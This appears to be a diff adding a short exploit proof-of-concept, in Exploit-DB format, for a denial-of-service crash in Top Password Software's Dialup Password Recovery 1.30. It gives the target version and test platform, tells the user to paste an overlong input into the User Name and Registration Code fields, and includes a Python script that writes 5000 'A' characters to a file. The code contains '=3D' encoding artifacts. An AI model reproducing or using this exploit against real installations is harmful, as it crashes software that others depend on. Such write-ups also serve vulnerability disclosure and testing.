@@ -1,0 +1,17 @@
+# Exploit Title: Top Password Software Dialup Password Recovery 1.30 - Denial of Service (PoC)
+# Date: 2020-01-12
+# Exploit Author: Antonio de la Piedra
+# Vendor Homepage: https://www.top-password.com/
+# Software Link: https://www.top-password.com/download/DialupPRSetup.exe
+# Version: 1.30
+# Tested on: Windows 7 SP1 32-bit
+
+# Copy paste the contents of poc.txt into the
+# User Name /  Registration Code input fields.
+
+#!/usr/bin/python
+
+poc =3D "A"*5000
+file =3D open("poc.txt","w")
+file.write(poc)
+file.close()
